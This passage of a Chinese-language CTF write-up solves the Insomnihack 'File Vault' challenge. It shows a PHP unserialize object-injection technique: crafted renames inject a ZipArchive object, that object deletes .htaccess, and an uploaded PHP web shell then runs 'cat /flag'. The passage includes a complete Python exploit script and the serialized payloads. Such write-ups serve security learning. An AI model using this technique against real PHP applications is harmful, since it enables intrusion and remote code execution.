    a:2:{i:0;s:39:"./././././././././././././";i:1;s:20:"A";i:1;s:8:"Injected";}
                   ---------------------------------------           --------    
    php > print_r(unserialize($x));
    Array
    (
        [0] => ./././././././././././././";i:1;s:20:"A
        [1] => Injected
    )
如你所见，一个新的“Injected”字符串已经被添加到反序列化的数组之中。我们在这个例子中，使用的字符串是“i:1;s:8:”Injected”，但同样，任何基元/对象都可以在这里使用。
在File Vault中，情况与之几乎相同。我们需要的就是一个数组，在这个数组中我们破坏了第一个对象，从而控制了第二个对象。
我们可以通过上传两个文件来实现漏洞的利用。就像上面的例子一样，我们具体操作如下：
  1. 上传两个文件，创建两个VaultFile对象；
  2. 用部分序列化的对象，重命名第二个VaultFile对象中的fakename；
  3. 借助../序列，重命名第一个VaultFile对象中的fakename，使其到达第二个VaultFile对象。  
请注意，由于我们现在使用的是Web应用程序的正常功能来执行上述操作，所以就不用再考虑签名的问题，这些操作一定是合法的。
## 使用任意数据伪造序列化对象
现在，我们就可以使用任意数据，来伪造我们自己的序列化对象。
在这一步骤中，我们需要解决的是一个经典的对象注入问题，但在这里，并没有太多技巧或者捷径可以供我们使用。
到目前为止，我们几乎已经用到了应用中所有的功能，但还有一个没有用过，那就是Open。以下是Open的相关代码：
    case 'open':
        $files = s_unserialize($_COOKIE['files'], $secret);
        if(isset($files[$_GET['i']])){
            echo nl2br($files[$_GET['i']]->open($files[$_GET['i']]->fakename,
                                $files[$_GET['i']]->realname));
        }
      exit;
Open操作会从$files数组中获取一个对象，并使用$object->fakename和$object->realname这两个参数来调用open()函数。
我们知道，可以在$files数组中注入任何对象（就像之前注入的“Injected”字符串一样）。但如果我们注入的不是VaultFile对象，会发生什么？
可以看到，open()这一方法名非常常见。如果我们能够在PHP中找到一个带有open()方法的标准类，那么就可以欺骗Web应用去掉用这个类的open()方法，而不再调用VaultFile的方法。
我们尝试对下面的操作进行替换：
    open($array[0]->fakename, $array[0]->realname);
可以通过欺骗Web应用程序，来实现这一点：
    open($array[0]->fakename, $array[0]->realname);
我们先来列出所有包含open()方法的类：
    $ cat list.php
    $methodn";
        }
      }
    ?>
    $ php list.php
    SQLite3->open
    SessionHandler->open
    XMLReader->open
    ZipArchive->open
经过寻找，我们一共发现有4个类带有open()方法。如果在$files数组中，注入这些类中任意一个的序列化对象，我们就可以通过带有特定参数的open动作，来调用这些类中的方法。
幸运的是，大部分类都能够对文件进行操作。回顾之前的研究过程，我们知道.htaccess会阻止我们执行PHP。所以，假如能通过某种方式删掉.htaccess文件，那这一题就搞定了。
现在，我们在本地去测试每个类的行为。经过一段时间的测试之后，我发现，ZipArchive->open方法可以删除目标文件，前提是我们需要将其第二个参数设定为“9”。
为什么要设定为9呢？原因在于， ZipArchive->open()的第二个参数是“指定其他选项”。而9对应的是ZipArchive::CREATE |
ZipArchive::OVERWRITE。由于ZipArchive打算覆盖我们的文件，所以就会先对其进行删除。在此，感谢[@pagabuc](https://github.com/pagabuc
"@pagabuc")帮助我们解释了这一参数的具体意义。
那么现在，我们就可以使用ZipArchive->open()来删除.htaccess文件。
## 获得Shell
最激动人心的时刻到了，我们来开发最终的有效载荷。
我写了一个Python脚本，以对Web应用程序实现自动化操作。
    #!/usr/bin/env python2
    import requests
    import urllib
    URL = "http://filevault.teaser.insomnihack.ch/"
    s = requests.Session()
    def upload(name):
        files = {'vault_file': (name, 'GARBAGE')}
        params = { "action" : "upload" }
        s.post(URL, params=params, files=files)
    def rename(index, new_name):
        data = { "newname" : new_name }
        params = {
            "action" : "changename",
            "i" : index
        }
        s.post(URL, params=params, data=data)
    def open_file(index):
        params = {
            "action" : "open",
            "i" : index
        }
    return s.get(URL, params=params).text
接下来，通过上传两个文件，来创建我们的VaultFile对象：
    upload("A")
    upload("B")
Web应用会将下面的Cookie发给我们：
    a:2:{i:0;O:9:"VaultFile":2:{s:8:"fakename";s:1:"A";s:8:"realname";s:44:"911aaba06e0a1f2c3c8072f3390db020d7c82b7a.txt";}i:1;O:9:"VaultFile":2:{s:8:"fakename";s:1:"B";s:8:"realname";s:44:"911aaba06e0a1f2c3c8072f3390db020d7c82b7a.txt";}}ce27b112cf5429bf6f09a905de8f4d110ab1ce6d39f27d4ec0226ab47c76721a
我们希望将恶意的部分序列化对象放在第二个fakename的开始。通过计算“A”与“B”之间的距离，得知第一个fakename和第二个fakename之间的距离是115个字符。
因此，为了到达第二个fakename，需要用115个”../“来重命名第一个fakename，我们稍后再进行这一步。
接下来，需要准备一个ZipArchive对象来注入这一Cookie。我们来创建一个对象：
    php > $zip = new ZipArchive();
    php > $zip->fakename = "sandbox/ea35676a8bfa0eeaac525ae05ab7fa2cce6616e2/.htaccess";
    php > $zip->realname = "9";
    php > echo serialize($zip);
    O:10:"ZipArchive":7:{s:8:"fakename";s:58:"sandbox/ea35676a8bfa0eeaac525ae05ab7fa2cce6616e2/.htaccess";s:8:"realname";s:1:"9";s:6:"status";i:0;s:9:"statusSys";i:0;s:8:"numFiles";i:0;s:8:"filename";s:0:"";s:7:"comment";s:0:"";}
由于我们的目的是调用ZipArchive->open(“.htaccess”,
“9”)，所以就添加了fakename和realname属性，其中包含了将要使用的参数。
如果像这样进行对象注入，会留下一个realname的小尾巴，而这可能会与我们之前所创建的伪造的realname相冲突。
    "...Our malicious ZipArchiver]";s:8:"realname";s:44:"911aaba06e0a1f2c3c8072f3390db020d7c82b7a.txt"
                                  ------------------------------(67 chars)---------------------------    
实际上，可以通过更新序列化的ZipArchive->comment参数的大小，来删除这个realname的小尾巴。尾部的大小为67，所以我们据此来更新comment的大小。
    O:10:"ZipArchive":7:{s:8:"fakename";s:58:"sandbox/ea35676a8bfa0eeaac525ae05ab7fa2cce6616e2/.htaccess";s:8:"realname";s:1:"9";s:6:"status";i:0;s:9:"statusSys";i:0;s:8:"numFiles";i:0;s:8:"filename";s:0:"";s:7:"comment";s:67:"";}
现在，万事具备。接下来对第二个VaultFile->fakename进行重命名。回到我们的Python脚本：
    # We end the first object with a dummy parameter, then start the second object
    # with our ZipArchive
    serialized_injection = '";s:1:"e";s:0:"";}i:1;O:10:"ZipArchive":7:{s:8:"fakename";s:58:"sandbox/ea35676a8bfa0eeaac525ae05ab7fa2cce6616e2/.htaccess";s:8:"realname";s:1:"9";s:6:"status";i:0;s:9:"statusSys";i:0;s:8:"numFiles";i:0;s:8:"filename";s:0:"";s:7:"comment";s:67:"'
    rename(1, serialized_injection)
接下来对第一个VaultFile->fakename进行重命名：
    newname = "../" * 115 # To overwrite fakename #2
    rename(0, newname)
最后，我们会收到如下Cookie：
    a:2:{i:0;O:9:"VaultFile":2:{s:8:"fakename";s:345:"./././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././";s:8:"realname";s:44:"911aaba06e0a1f2c3c8072f3390db020d7c82b7a.txt";}i:1;O:9:"VaultFile":2:{s:8:"fakename";s:245:"";s:1:"e";s:0:"";}i:2;O:10:"ZipArchive":7:{s:8:"fakename";s:58:"sandbox/ea35676a8bfa0eeaac525ae05ab7fa2cce6616e2/.htaccess";s:8:"realname";s:1:"9";s:6:"status";i:0;s:9:"statusSys";i:0;s:8:"numFiles";i:0;s:8:"filename";s:0:"";s:7:"comment";s:67:"";s:8:"realname";s:44:"911aaba06e0a1f2c3c8072f3390db020d7c82b7a.txt";}}6f72e63954ac6e08c3ebc6e4abdff60956a82d9ebc556873410c9ef456098b69
上传Shell（由于.htaccess文件还没有被删除，所以它不会被执行）：
借助Unserialize()对Cookie进行反序列化，并触发ZipArchive->open()函数调用：
最后，再次访问Shell：
得到Flag：INS{gr4tz_f0r_y0ur_uns3ri4l1z1ng_tal3nts}
## 源代码
以下是我的完整Python源代码：
    #!/usr/bin/env pyth#!/usr/bin/env python2
    import requests
    import urllib
    URL = "http://filevault.teaser.insomnihack.ch/"
    s = requests.Session()
    def upload(name, content="GARBAGE"):
        files = {'vault_file': (name, content)}
        params = { "action" : "upload" }
        s.post(URL, params=params, files=files)
    def rename(index, new_name):
        data = { "newname" : new_name }
        params = {
            "action" : "changename",
            "i" : index
        }
        s.post(URL, params=params, data=data)
    def open_file(index):
        params = {
            "action" : "open",
            "i" : index
        }
        return s.get(URL, params=params).text
    newname = "../" * 115 # To overwrite fakename #2
    serialized_injection = '";s:1:"e";s:0:"";}i:1;O:10:"ZipArchive":7:{s:8:"fakename";s:58:"sandbox/b630d75c8dcfee915aec97cc3bb5d1d4c782345b/.htaccess";s:8:"realname";s:1:"9";s:6:"status";i:0;s:9:"statusSys";i:0;s:8:"numFiles";i:0;s:8:"filename";s:0:"";s:7:"comment";s:67:"'
    # Upload 2 files
    upload("A")
    upload("B")
    # Rename to inject serialized ZipArchiver
    rename(1, serialized_injection)
    rename(0, newname)
    # Upload a shell
    upload("shell.php", "")
    # Cookie received
    print " === Cookie === "
    print urllib.unquote(s.cookies['files'])
    # Trigger .htaccess removal
    open_file(1)
    shell_url = URL + "sandbox/b630d75c8dcfee915aec97cc3bb5d1d4c782345b/fe95113d494997061044e7142af542e84f3eebbf.php"
    response = requests.get(shell_url, params={"cmd" : "cat /flag"})
    flag = response.text
    print flag